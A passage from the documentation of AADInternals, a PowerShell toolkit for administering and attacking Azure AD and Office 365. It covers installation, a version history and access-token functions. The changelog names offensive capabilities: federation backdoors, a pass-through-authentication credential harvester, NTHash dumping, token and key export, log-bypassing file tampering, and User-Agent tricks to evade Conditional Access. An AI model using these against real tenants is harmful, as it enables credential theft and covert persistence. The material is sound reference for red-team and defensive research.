<li><a href="#get-aadintportalaccesstokenusingcba">Get-AADIntPortalAccessTokenUsingCBA</a></li>
</ul></li>
<li><a href="#access-package-functions">Access Package functions</a>
<ul>
<li><a href="#get-aadintaccesspackages-ap">Get-AADIntAccessPackages (AP)</a></li>
<li><a href="#get-aadintaccesspackagecatalogs-ap">Get-AADIntAccessPackageCatalogs (AP)</a></li>
<li><a href="#get-aadintaccesspackageadmins-ap">Get-AADIntAccessPackageAdmins (AP)</a></li>
</ul></li>
<li><a href="#b2c-functions">B2C functions</a>
<ul>
<li><a href="#get-aadintb2cencryptionkeys-m">Get-AADIntB2CEncryptionKeys (M)</a></li>
<li><a href="#new-aadintb2crefreshtoken">New-AADIntB2CRefreshToken</a></li>
<li><a href="#new-aadintb2cauthorizationcode">New-AADIntB2CAuthorizationCode</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
			<p></p>

<h1 id="introduction">Introduction</h1>

<p><strong>AADInternals</strong> toolkit is a PowerShell module containing tools for administering and hacking Azure AD and Office 365. It is listed in MITRE ATT&amp;CK with id <a href="https://attack.mitre.org/software/S0677/" target="_blank">S0677</a>.</p>

<h2 id="installation">Installation</h2>

<p>The module can be installed from PowerShell:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Install the module</span>
<span class="nb">Install-Module</span> <span class="n">AADInternals</span>

<span class="c"># Import the module</span>
<span class="nb">Import-Module</span> <span class="n">AADInternals</span>
</code></pre></div>
<p></p>

<p>Output:</p>

<pre><code>    ___    ___    ____  ____      __                        __    
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ '/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  ) 
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/  
  
 v0.9.3 by @DrAzureAD (Nestori Syynimaa)

</code></pre>

<p>The module is also available in GitHub <a href="https://github.com/Gerenios/AADInternals">https://github.com/Gerenios/AADInternals</a> and <a href="https://www.powershellgallery.com/packages/AADInternals/" target="_blank">PowerShell Gallery</a>.</p>

<h2 id="about">About</h2>

<p><strong>AAD Internals</strong> is a PowerShell module where I’ve tried to put all the knowledge I’ve gained during the years spent with Office 365 and Azure AD.
It is a result of hours of reverse-engineering and debugging of Microsoft tools related to Azure AD, such as PowerShell modules,
directory synchronisation, and admin portals.</p>

<p>The module is a <strong>plain PowerShell script module</strong>, so you can copy and paste the code to your own scripts as needed. Having said that,
the are some functions that are utilising the built-in functionality of Windows. Thus, everything might not work on every computer.</p>

<p>The module is now on beta, so all comments and ideas are more than welcome. You can comment to this article or post
bugs and fixes to GitHub.</p>

<p>I haven’t tried to duplicate all functionality MSOnline or AzureAD modules currently have.
Instead, I decided to bring that information and functionality those modules doesn’t provide. Also, I have created some “blackhat” level
functionality that allows administrators to do things that shouldn’t be even possible..</p>

<p>Detailed help about parameters etc. can be seen using PowerShell Get-Help cmdlet:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># See help for Get-AADIntAccessTokenForAADGraph</span>
<span class="nb">Get-Help</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span>
</code></pre></div>
<p></p>

<h2 id="version-info">Version info</h2>

<table>
<thead>
<tr>
<th>Version</th>
<th>Date</th>
<th>Version notes</th>
</tr>
</thead>

<tbody>
<tr>
<td>0.9.3</td>
<td>Jan 14th 2024</td>
<td>Added <a href="#test-aadintsaraport">Test‑AADIntSARAPort</a> and <a href="#resolve-aadintsarahost">Resolve‑AADIntSARAHost</a>.<br>Added <a href="#get-aadintb2cencryptionkeys-m">Get‑AADIntB2CEncryptionKeys</a> to export B2C token encryption keys, and <a href="#new-aadintb2crefreshtoken">New‑AADIntB2CRefreshToken</a> &amp; <a href="#new-aadintb2cauthorizationcode">New‑AADIntB2CAuthorizationCode</a> to exploit them.<br> Added <a href="#get-aadintazureadfeatures-a">Get‑AADIntAzureADFeatures</a>, <a href="#get-aadintazureadfeature-a">Get‑AADIntAzureADFeature</a>, and <a href="#set-aadintazureadfeature-a">Set‑AADIntAzureADFeature</a> for listing and modifying Azure AD/Entra ID features.<br> Added <a href="#add-aadintsyncfabricserviceprincipal-a">Add‑AADIntSyncFabricServicePrincipal</a> for adding a missing Microsoft.Azure.SyncFabric service principal if BPRT creation fails.<br> Modified <a href="#convertto-aadintbackdoor-a">ConvertTo‑AADIntBackdoor</a> to add backdoor certificate to NextSigningCertificate if the domain is already federated.<br> Added <a href="#install-aadintforcenthash">Install‑AADIntForceNTHash</a>, <a href="#remove-aadintforcenthash">Remove‑AADIntForceNTHash</a>, and <a href="#initialize-aadintfullpasswordsync">Initialize‑AADIntFullPasswordSync</a>.</td>
</tr>

<tr>
<td>0.9.2</td>
<td>Oct 2nd  2023</td>
<td>“<a href="https://engage.secureworks.com/tisummit2023" target="_blank">TI Summit</a> edition”. <br> Added support for external SQLExpress database to  <a href="#get-aadintsynccredentials">Get‑AADIntSyncCredentials</a>.<br>When using -Credential switch to get access token, ROPC flow is tried first. If it fails (due to MFA etc.), interactive authentication is used.<br> Added DKIM and MTA-STS to <a href="#invoke-aadintreconasoutsider">Invoke‑AADIntReconAsOutsider</a>.</td>
</tr>

<tr>
<td>0.9.1</td>
<td>Aug 15th 2023</td>
<td>“<a href="https://defcon.org" target="_blank">DEFCON31</a> edition”. <br> Added <a href="#get-aadintmyteams-t">Get‑AADIntMyTeams</a> to show user’s teams. <br> Added <a href="#export-aadintspositefile-s">Export‑AADIntSPOSiteFile</a> to export files from SPO (and Teams &amp; OneDrive). <br> Added <a href="#add-aadintspositefiles-s">Add‑AADIntSPOSiteFiles</a> to spoof SPO files (modify user and timestamps) using SPMT protocol (bypasses logging). <br> Added <a href="#update-aadintspositefile-s">Update‑AADIntSPOSiteFiles</a> to tamper with existing SPO files (modify content, user and timestamps) using SPMT protocol (bypasses logging).</td>
</tr>

<tr>
<td>0.9.0</td>
<td>Jun 29th 2023</td>
<td>“<a href="https://troopers.de" target="_blank">TROOPERS23</a> edition”. Totally redesigned authentication and added support for PS7 - expect 🪲 to be found. Interactive login works now entirely in CMD line (no pop-up windows). Does automatic MFA if TAP or OTPSecretKey provided (and available for user)🔥 <br> Added <a href="#configuration">configuration functions</a> to store settings and set User-Agent. <br> Added <a href="#set-aadintdevicewhfbkey">Set‑AADIntDeviceWHfBKey</a> to set Windows Hello for Business key as MFA method to the given user.<br> Added <a href="#get-aadintusernthash">Get‑AADIntUserNTHash</a> for dumping NTHashes from Azure AD. <br> Updated <a href="#set-aadintuserpassword-a">Set‑AADIntUserPassword</a> to support custom encryption certificate. <br> Added <strong>-CloudAP</strong> switch to <a href="##get-aadintuserprtkeys">Get‑AADIntUserPRTKeys</a> for getting PRT and Session key using user’s credentials.</td>
</tr>

<tr>
<td>0.8.2</td>
<td>May 15th 2023</td>
<td>“<a href="https://www.blackhat.com/asia-23/" target="_blank">Black Hat Asia 2023</a> edition”. Added <a href="#access-package-functions">Access Package functions</a> to list Access Packages, Access Package Catalogs, and Access Package administrators. <br> Refactored <a href="#token-cache">token cache</a> and added automatic FOCI client handling.</td>
</tr>

<tr>
<td>0.8.1</td>
<td>Apr  4th 2023</td>
<td>Added <a href="#set-aadintazureadgroupmember-a">Set‑AADIntAzureADGroupMember</a> to modify members of synchronised groups. <br>Updated <a href="#get-aadintsynccredentials">Get‑AADIntSyncCredentials</a> to use a background process (doesn’t elevate the current PS session). <br>Updated <a href="#set-aadintuserpassword-a">Set‑AADIntUserPassword</a>: <strong>-IncludeLegacy</strong> switch synchronises also legacy NTHash to Azure AD which will be synchronised to Azure AD Domain Services (AADDS) DCs. <br>Added <strong>DisplayName</strong> parameter to <a href="#set-aadintazureadpolicydetails-a">Set‑AADIntAzureADPolicyDetails</a>. <br>Updated <a href="#invoke-aadintreconasoutsider">Invoke‑AADIntReconAsOutsider</a> to show tenant’s Microsoft Defender for Identity (MDI) instance. <br>Added new authentication endpoint (RST2) to <a href="#invoke-aadintuserenumerationasoutsider">Invoke‑AADIntUserEnumerationAsOutsider</a>. <br>Updated <a href="#invoke-aadintreconasinsider-ac">Invoke‑AADIntReconAsInsider</a> to show tenant’s Azure AD SKU.</td>
</tr>

<tr>
<td>0.8.0</td>
<td>Nov 28th 2022</td>
<td>“<a href="https://bsidesorlando.org/" target="_blank">BSides Orlando</a> 2022 edition”. <br> Added <a href="#get-aadintaccesstokenusingimds">Get‑AADIntAccessTokenUsingIMDS</a> to get access tokens using Azure Instance Metadata Service (IMDS) for VM’s using managed identities.  <br> Added <a href="#new-aadintmoeradomain-z">New‑AADIntMOERADomain</a> to add new Microsoft Online Email Routing Address (MOERA) domain (.onmicrosoft.com) to the tenant. Added <a href="#get-aadintazureadpolicies-a">Get‑AADIntAzureADPolicies</a> and <a href="#set-aadintazureadpolicydetails-a">Set‑AADIntAzureADPolicyDetails</a>.</td>
</tr>

<tr>
<td>0.7.8</td>
<td>Nov  4th 2022</td>
<td>“<a href="https://def.camp" target="_blank">Def.Camp</a> 2022 edition”. <br> Moved bootstrap export functionality from <a href="#export-aadintproxyagentcertificates">Export‑AADIntProxyAgentCertificates</a> to separate function <a href="#export-aadintproxyagentbootstraps">Export‑AADIntProxyAgentBootstraps</a> due to permission issues.</td>
</tr>

<tr>
<td>0.7.7</td>
<td>Oct 21th 2022</td>
<td>Updated <a href="#export-aadinttokenbrokertokens">Export‑AADIntTokenBrokerTokens</a> to support TBRES files with version number 2.</td>
</tr>

<tr>
<td>0.7.6</td>
<td>Oct 20th 2022</td>
<td>Added missing TBRES.ps1</td>
</tr>

<tr>
<td>0.7.5</td>
<td>Oct 20th 2022</td>
<td>Added <a href="#export-aadinttokenbrokertokens">Export‑AADIntTokenBrokerTokens</a>.<br>Updated <a href="#export-aadintteamstokens">Export‑AADIntTeamsTokens</a> to support the updated schema.<br>Updated cache logic: If ClientId+Resource combination is not found from the cache, it uses the first entry with the same resource (regardless of the ClientId). This helps on using the exported tokens 😉</td>
</tr>

<tr>
<td>0.7.4</td>
<td>Oct 17th 2022</td>
<td>Fixed various functions using internal Set-BinaryContent function. Updated <a href="#invoke-aadintreconasoutsider" target="_blank">Invoke‑AADIntReconAsOutsider</a> to include Tenant region.</td>
</tr>

<tr>
<td>0.7.3</td>
<td>Oct  1st 2022</td>
<td>Fixed <a href="#set-aadintspositemembers-s">Set‑AADIntSPOSiteMembers</a> merge issues.</td>
</tr>

<tr>
<td>0.7.2</td>
<td>Oct  1st 2022</td>
<td>Added <a href="#export-aadintazureclitokens">Export‑AADIntAzureCliTokens</a> and <a href="#export-aadintteamstokens">Export‑AADIntTeamsTokens</a>. <br> Added <a href="#get-aadinttenantdomain-m">Get‑AADIntTenantDomain</a> to get domain name using tenant id. <br> Added -GetRelayingParties switch to <a href="#invoke-aadintreconasoutsider">Invoke‑AADIntReconAsOutsider</a> to extract Relaying Trust parties from the AD FS server. <br> Added <a href="#set-aadintspositemembers-s">Set‑AADIntSPOSiteMembers</a>.</td>
</tr>

<tr>
<td>0.7.1</td>
<td>Sep 16th 2022</td>
<td>More bug fixes.</td>
</tr>

<tr>
<td>0.7.0</td>
<td>Sep 9th  2022</td>
<td>Bug fixes.</td>
</tr>

<tr>
<td>0.6.9</td>
<td>Sep 8th  2022</td>
<td>Added functionality to add tokens to cache, added gMSA support and account lookup to <a href="#get-aadintlsasecrets">Get‑AADIntLSASecrets</a>. <br> Updated <a href="#export-aadintadfscertificates">Export‑AADIntADFSCertificates</a>: Exports also custom certificates (not stored in config db). “Local export” now uses a service running as AD FS service account to fetch DKM decryption key from AD.<br>Added proof-of-concept <a href="#certificate-based-authentication-cba">CBA functionality</a>. <br> Added CBA information to <a href="#invoke-aadintreconasoutsider">Invoke‑AADIntReconAsOutsider</a>. <br> Added <a href="#export-aadintproxyagentcertificates">Export‑AADIntProxyAgentCertificates</a> to export PTA &amp; provisioning agent certificates. Fixed <a href="#set-aadintptacertificate">Set‑AADIntPTACertificate</a>.<br>Exposed <a href="#get-aadintaccesstoken">Get-AADIntAccessToken</a> and <a href="#get-aadintaccesstokenwithrefreshtoken">Get‑AADIntAccessTokenWithRefreshToken</a> 😱 <br> Added -UpdateTrust option to <a href="#register-aadintptaagent-p">Register-AADIntPTAAgent</a> and <a href="#register-aadintsyncagent-p">Register‑AADIntSyncAgent</a> for renewing certificates. Added functionality to add tokens to cache, added gMSA support and account lookup to <a href="#get-aadintlsasecrets">Get‑AADIntLSASecrets</a>. <br> Updated <a href="#export-aadintadfscertificates">Export‑AADIntADFSCertificates</a>: Exports also custom certificates (not stored in config db). “Local export” now uses a service running as AD FS service account to fetch DKM decryption key from AD.<br>Added proof-of-concept <a href="#certificate-based-authentication-cba">CBA functionality</a>. <br> Added CBA information to <a href="#invoke-aadintreconasoutsider">Invoke‑AADIntReconAsOutsider</a>. <br> Added <a href="#export-aadintproxyagentcertificates">Export‑AADIntProxyAgentCertificates</a> to export PTA &amp; provisioning agent certificates. Fixed <a href="#set-aadintptacertificate">Set‑AADIntPTACertificate</a>.<br>Exposed <a href="#get-aadintaccesstoken">Get-AADIntAccessToken</a> and <a href="#get-aadintaccesstokenwithrefreshtoken">Get‑AADIntAccessTokenWithRefreshToken</a> 😱 <br> Added -UpdateTrust option to <a href="#register-aadintptaagent-p">Register-AADIntPTAAgent</a> and <a href="#register-aadintsyncagent-p">Register‑AADIntSyncAgent</a> for renewing certificates.</td>
</tr>

<tr>
<td>0.6.8</td>
<td>Jun 3rd  2022</td>
<td>Added functionality to unprotect <a href="#unprotect-aadintestsauthpersistentcookie">ESTSAUTHPERSISTENT</a> cookie.</td>
</tr>

<tr>
<td>0.6.7</td>
<td>Jun 3rd  2022</td>
<td>Added functionality to <a href="#get-aadintsyncfeatures-a">list</a> and <a href="#set-aadintsyncfeatures-a">modify</a> sync features. <br> Removed Get-PassThroughAuthenticationStatus and Invoke-AADIntPTAAgent. <br> Added: <a href="#find-aadintteamsexternaluser-t">Find-AADIntTeamsExternalUser</a> for getting user’s Teams information (including Azure AD object id), <a href="#get-aadintteamsavailability-t">Get-TeamsAvailability</a> for getting user’s Teams availability information, <a href="#get-aadinttranslation-t">Get-AADIntTranslation</a> for translating any text to specified language, <a href="#get-aadinttenantorganisationinformation-ad">Get-AADIntTeanantOrganisationInformation</a> for getting tenant information using tenantid (includes tenant name), and <a href="#start-aadintspeech-on">Start-AADIntSpeech</a> for speaking out the given text.</td>
</tr>

<tr>
<td>0.6.6</td>
<td>Feb 15th 2022</td>
<td>Added functionality to export the <a href="#export-aadintlocaldevicecertificate">device certificate</a> and <a href="#export-aadintlocaldevicetransportkey">transport keys</a> of Azure AD Joined and Registered devices. <br> Added functionality to configure (i.e. “<a href="#join-aadintlocaldevicetoazuread">join</a>”) Windows devices using AADInternals generated or exported certificates. Added functionality to set <a href="#set-aadintproxysettings">proxy</a> settings to help MITM. <br>Added <a href="#find-aadintmspartners">Find-AADIntMSPartner</a>.</td>
</tr>

<tr>
<td>0.6.5</td>
<td>Dec 13th 2021</td>
<td>Added MSPartner <a href="#ms-partner-functions" target="_blank">functionality</a> &amp; included in Invoke-AADIntReconAsInsider. <br>Added functions for creating and decoding AD FS refresh tokens.<br> Added some utilities + bug fixes.</td>
</tr>

<tr>
<td>0.6.4</td>
<td>Sep 21st 2021</td>
<td>“<a href="https://online.commsverse.com" target="_blank">Commsverse</a> edition”. Bug fix for loading System.Xml.XmlDictionary.</td>
</tr>

<tr>
<td>0.6.3</td>
<td>Sep 15th 2021</td>
<td>“<a href="https://online.commsverse.com" target="_blank">Commsverse</a> edition”. Minor bug fixes for Teams and access token functions.</td>
</tr>

<tr>
<td>0.6.2</td>
<td>Sep  1st 2021</td>
<td>Added <a href="#search-aadintunifiedauditlog-ca">Search-AADIntUnifiedAuditLog</a> function! <br> Added <a href="#set-aadintselfservicepurchaseproduct-cm">Set-AADIntSelfServicePurchaseProduct</a> for enabling and disabling self-service product purchases. <br> Updated <a href="#register-aadintmfaapp-my">Register-AADIntMFAApp</a> to support OTP registration. <br> Added <a href="#open-aadintowa-o">Open-AADIntOWA</a> for opening OWA using provided access token.</td>
</tr>

<tr>
<td>0.6.1</td>
<td>Aug 26th 2021</td>
<td>“<a href="https://helsec.fi/" target="_blank">HelSec</a> edition”. Bug fix to <a href="#get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog</a> function.</td>
</tr>

<tr>
<td>0.6.0</td>
<td>Aug 26th 2021</td>
<td>“<a href="https://helsec.fi/" target="_blank">HelSec</a> edition”. Decreased the module loading time by using .psd1 and .psm1 in a way they were meant to. <br>Added <a href="#get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog</a> function.</td>
</tr>

<tr>
<td>0.5.0</td>
<td>Aug 23rd 2021</td>
<td>Added <a href="#hybrid-health-functions">hybrid health</a> functionality allowing spoofing Azure AD sign-ins log. <br>Fixed a bug getting access tokens with kerberos tickets. <br>Yet another new enumeration method for <a href="#invoke-aadintuserenumerationasoutsider" target="_blank">Invoke-AADIntUserEnumerationAsOutsider</a>!</td>
</tr>

<tr>
<td>0.4.9</td>
<td>Jun 30th 2021</td>
<td>Updated <a href="#invoke-aadintuserenumerationasoutsider" target="_blank">Invoke-AADIntUserEnumerationAsOutsider</a> (new enumeration method) and <a href="#get-aadintsynccredentials" target="_blank">Get-AADIntSyncCredentials</a> (support for multiple forests). Bug fixes for MFA apps, Azure AD Join and OneDrive.</td>
</tr>

<tr>
<td>0.4.8</td>
<td>May 11th 2021</td>
<td>“<a href="https://www.teamsnation.online/" target="_blank">Teams Nation</a> edition”. Fixed Send-AADIntTeamsMessage. Added AD FS policy store rule modification functionality.</td>
</tr>

<tr>
<td>0.4.7</td>
<td>Apr 27th 2021</td>
<td>Refactored Kerberos and AD FS certificate export functionality. Added remote AD FS configuration export. Added some DRS functionality from DSInternals.</td>
</tr>

<tr>
<td>0.4.6</td>
<td>Mar 3rd  2021</td>
<td>Added Azure AD register and Hybrid Join by federation functionality and some smaller improvements. Fixed access token for MySigns. Updated AD FS certificate export function.<br>PRT can now be fetched with cached refresh token instead of credentials.<br>Updated SAML token signatures to SHA256.</td>
</tr>

<tr>
<td>0.4.5</td>
<td>Jan 31st 2021</td>
<td>Added BPRT (bulk PRT) and Hybrid Join functionality. Added functionality for handing Rollout Policies, Azure Diagnostic Settings, and Unified Audit Log Settings.</td>
</tr>

<tr>
<td>0.4.4</td>
<td>Oct 18th 2020</td>
<td>“<a href="https://www.identitysummit.cloud/" target="_blank">Cloud Identity Summit 2020</a> edition”. Added device code authentication support access token functions (-UseDeviceCode). <br> Added phishing functionality. <br> Added -GetNonce switch for New-AADIntUserPRTToken. <br> Added Teams functionality.</td>
</tr>

<tr>
<td>0.4.3</td>
<td>Sep 29th 2020</td>
<td>Added Azure Cloud Shell functionality + updates to PRT/MDM.</td>
</tr>

<tr>
<td>0.4.2</td>
<td>Sep 9th  2020</td>
<td>Added MDM functionality.</td>
</tr>

<tr>
<td>0.4.1</td>
<td>Sep 1st  2020</td>
<td>Added functionality for joining “devices” to Azure AD and Intune MDM. Added PRT functionality. Some bug fixes.</td>
</tr>

<tr>
<td>0.4.0</td>
<td>Aug 6th  2020</td>
<td>Updated the Access Token cache behaviour. Now, when saved to cache, access token gets updated automatically if expired. <br>Added functionality for getting Azure AD tenant information and enumerating users as a an outsider, guest, and insider user.</td>
</tr>

<tr>
<td>0.3.3</td>
<td>Jun 3rd  2020</td>
<td>Added functionality for elevating Global Admin to Azure User Access Administrator and functions for accessing some Azure workloads 😁</td>
</tr>

<tr>
<td>0.3.2</td>
<td>May 28th 2020</td>
<td>“psconf.eu edition”. Bug fixes and some minor feature updates to existing functions.</td>
</tr>

<tr>
<td>0.3.1</td>
<td>May 17th 2020</td>
<td>Added functionality for registering Sync agents (Azure AD Connect cloud provisioning) and listing agent information. Fixed exporting Azure AD Connect credentials and added many AD related Mimikatz-like functions.</td>
</tr>

<tr>
<td>0.2.8</td>
<td>Mar 30th 2020</td>
<td>Added functionality for registering PTA Agents and configuring users’ MFA settings. Includes an experimental PTA Agent that emulates Azure AD pass-through authentication.</td>
</tr>

<tr>
<td>0.2.7</td>
<td>Dec 12th 2019</td>
<td>“Black Hat Europe edition”. <br>Added OneDrive for Business functions. Allows bypassing OneDrive (and SharePoint &amp; Teams) domain restrictions.</td>
</tr>

<tr>
<td>0.2.6</td>
<td>Oct 30th 2019</td>
<td>“T2 infosec edition”. <br>Added Kerberos support. Allows getting Access Tokens using Kerberos tickets, and using Seamless Single-Sign-On as backdoor.</td>
</tr>

<tr>
<td>0.2.5</td>
<td>Aug 16th 2019</td>
<td>ADFS certificate export finally working! Bug fixes.</td>
</tr>

<tr>
<td>0.2.4</td>
<td>Aug 2nd  2019</td>
<td>“Black Hat edition”. <br>Added client, SPO, and SARA functions, several bug fixes.</td>
</tr>

<tr>
<td>0.2.3</td>
<td>May 29th 2019</td>
<td>Added functions to manipulate ADFS token signing certificates.</td>
</tr>

<tr>
<td>0.2.2</td>
<td>May 22nd 2019</td>
<td>Added PTASpy (pass-through authentication credential harvester and backdoor).</td>
</tr>

<tr>
<td>0.1.8</td>
<td>May 17th 2019</td>
<td>Added functions to extract and reset Azure AD Connect credentials.</td>
</tr>

<tr>
<td>0.1.7</td>
<td>May 10th 2019</td>
<td>Added Exchange Online and Outlook functionality + loads of other updates.</td>
</tr>

<tr>
<td>0.1.1</td>
<td>Oct 25th 2018</td>
<td>The first beta release.</td>
</tr>
</tbody>
</table>

<h2 id="configuration">Configuration</h2>

<p>Since version 0.9.0, AADInternals has a config.json file for storing persistent settings. The file is located in AADInternals module folder:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get AADInternals module folder</span>
<span class="nb">Get-Module</span> <span class="n">AADInternals</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">Path</span>
</code></pre></div>
<p></p>

<pre><code>C:\Program Files\WindowsPowerShell\Modules\AADInternals\0.9.0\AADInternals.psm1
</code></pre>

<h3 id="read-aadintconfiguration">Read-AADIntConfiguration</h3>

<p>Loads AADInternals settings from config.json. All changes made after loading AADInternals module will be lost.</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Read settings from config.json</span>
<span class="nb">Read-AADIntConfiguration</span>
</code></pre></div>


<h3 id="save-aadintconfiguration">Save-AADIntConfiguration</h3>

<p>Saves the current AADInternals settings to config.json. Settings will be loaded when AADInternals module is loaded.</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Save settings to config.json</span>
<span class="nb">Save-AADIntConfiguration</span>
</code></pre></div>


<pre><code>Settings saved.
</code></pre>

<h3 id="get-aadintconfiguration">Get-AADIntConfiguration</h3>

<p>Shows AADInternals settings</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show current settings</span>
<span class="nb">Get-AADIntConfiguration</span>
</code></pre></div>


<pre><code>Name                           Value                                                        
----                           -----                                                        
SecurityProtocol               Tls12                                                        
User-Agent                     AADInternals 
</code></pre>

<h3 id="set-aadintsetting">Set-AADIntSetting</h3>

<p>Sets the given setting with given value</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add a custom User-Agent</span>
<span class="nb">Set-AADIntSetting</span> <span class="n">-Setting</span> <span class="s2">"User-Agent"</span> <span class="n">-Value</span> <span class="s2">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"</span>
</code></pre></div>


<h3 id="set-aadintuseragent">Set-AADIntUserAgent</h3>

<p>Sets a pre configured User-Agent for a specific device that AADInternals will use in requests. Supported devices: ‘Windows’,‘MacOS’,‘Linux’,‘iOS’,‘Android’. To persist, use Save-AADIntConfiguration after setting the User-Agent.</p>

<p>Using different User-Agents may help evading Conditional Access policies 😉</p>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Use Windows User-Agent</span>
<span class="nb">Set-AADIntUserAgent</span> <span class="n">-Device</span> <span class="n">Windows</span>
</code></pre></div>


<h1 id="functionality">Functionality</h1>

<h2 id="playing-with-access-tokens">Playing with access tokens</h2>

<h3 id="get-aadintaccesstokenfor-lt-service">Get-AADIntAccessTokenFor&lt;Service&gt;</h3>

<p>Most of the functions are using REST APIs which require OAuth access tokens. The AADInternals module is using the following types of access tokens. Since version 0.4.0, all tokens are cached if
<strong>-SaveToCache</strong> switch is used. If expired, cached tokens are automatically renewed with the corresponding refresh token.</p>

<table>
<thead>
<tr>
<th>Token/API</th>
<th>Function</th>
<th>Remarks</th>
</tr>
</thead>

<tbody>
<tr>
<td>AAD Graph</td>
<td>Get-AADIntAccessTokenForAADGraph</td>
<td>Functions using AAD Graph access token.</td>
</tr>

<tr>
<td>MS Graph</td>
<td>Get-AADIntAccessTokenForMSGraph</td>
<td>Functions using MS Graph access token.</td>
</tr>

<tr>
<td>Pass Through Authentication</td>
<td>Get-AADIntAccessTokenForPTA</td>
<td>Used when enabling/disabling PTA and Seamless SSO (Desktop SSO)</td>
</tr>

<tr>
<td>Azure Admin Portal</td>
<td>Get-AADIntAccessTokenForAADIAMAPI</td>
<td>Used when inviting guest users.</td>
</tr>

<tr>
<td>Exchange Online</td>
<td>Get-AADIntAccessTokenForEXO</td>
<td>Used with Exchange Online and ActiveSync functions</td>
</tr>

<tr>
<td>Support and Recovery Assistant</td>
<td>Get-AADIntAccessTokenForSARA</td>
<td>Used with Support and Recovery Assistant functions</td>
</tr>

<tr>
<td>SharePoint Online</td>
<td>Get-AADIntSPOAuthenticationHeader</td>
<td>Used with SharePoint Online functions</td>
</tr>

<tr>
<td>OneDrive for Business</td>
<td>New-AADIntOneDriveSettings</td>
<td>Used with OneDrive for Business functions</td>
</tr>

<tr>
<td>Azure Core Management</td>
<td>Get-AADIntAccessTokenForAzureCoreManagemnt</td>
<td>Used with Azure Core Management functions</td>
</tr>

<tr>
<td>Azure AD Join</td>
<td>Get-AADIntAccessTokenForAADJoin</td>
<td>Used with Azure AD join function</td>
</tr>

<tr>
<td>Azure Intune MD</td>
<td>Get-AADIntAccessTokenForIntuneMDM</td>
<td>Used with Intune MDM functions</td>
</tr>

<tr>
<td>Azure Cloud Shell</td>
<td>Get-AADIntAccessTokenForCloudShell</td>
<td>Used with Azure Cloud Shell</td>
</tr>
</tbody>
</table>

<p>To get an AAD Graph access token and save it to cache, run the following function. The token will be valid for an hour, after that, a new access token is fetched using the refresh token.
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Prompt for credentials and retrieve &amp; store access token to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>
</code></pre></div>
<p></p>

<p>To see the cached credentials:
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Show the cached credentials</span>
<span class="nb">Get-AADIntCache</span>
</code></pre></div>

Output:<p></p>

<pre><code>Name            : admin@company.com
ClientId        : d3590ed6-52b3-4102-aeff-aad2292ab01c
Audience        : https://management.core.windows.net
Tenant          : 2b55c1c4-ba18-46d0-9a7a-7a75b9493dbd
IsExpired       : False
HasRefreshToken : True

Name            : admin@company.com
ClientId        : 1b730954-1685-4b74-9bfd-dac224a7b894
Audience        : https://graph.windows.net
Tenant          : 2b55c1c4-ba18-46d0-9a7a-7a75b9493dbd
IsExpired       : False
HasRefreshToken : True
</code></pre>

<h3 id="get-aadintaccesstoken">Get-AADIntAccessToken</h3>

<p>This is an internal utility function used by all <strong>Get-AADIntAccessTokenFor&lt;service&gt;</strong> functions. Exposed in version <strong>0.6.9</strong>.</p>

<p>Gets OAuth Access Token for the given client and resource. Using the given authentication method. If not provided, uses interactive logon.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token for MS Graph API for "Microsoft Office" client using interactive login</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessToken</span> <span class="n">-ClientId</span> <span class="s2">"d3590ed6-52b3-4102-aeff-aad2292ab01c"</span> <span class="n">-Resource</span> <span class="s2">"https://graph.microsoft.com"</span> 
</code></pre></div>
<p></p>

<p><strong>Example 2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and refresh token for MS Graph API for "Microsoft Office" client using interactive login and save to cache</span>
<span class="nv">$at</span><span class="p">=</span><span class="nb">Get-AADIntAccessToken</span> <span class="n">-ClientId</span> <span class="s2">"d3590ed6-52b3-4102-aeff-aad2292ab01c"</span> <span class="n">-Resource</span> <span class="s2">"https://graph.microsoft.com"</span> 
</code></pre></div>

<strong>Output:</strong><p></p>

<pre><code>AccessToken saved to cache.

Tenant   : 9779e97e-de19-45be-87ab-a7ed3e86fa62
User     : user@company.com
Resource : https://graph.microsoft.com
Client   : d3590ed6-52b3-4102-aeff-aad2292ab01c
</code></pre>

<h3 id="get-aadintaccesstokenwithrefreshtoken">Get-AADIntAccessTokenWithRefreshToken</h3>

<p>This is an internal utility function used to renew access tokens. Exposed in version <strong>0.6.9</strong>.</p>

<p>Gets OAuth Access Token for the given client and resource using the given refresh token.
For FOCI refresh tokens, i.e.,Family Refresh Tokens (FRTs), you can use any FOCI client id.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and refresh token for MS Graph API for "Microsoft Office" client using interactive login</span>
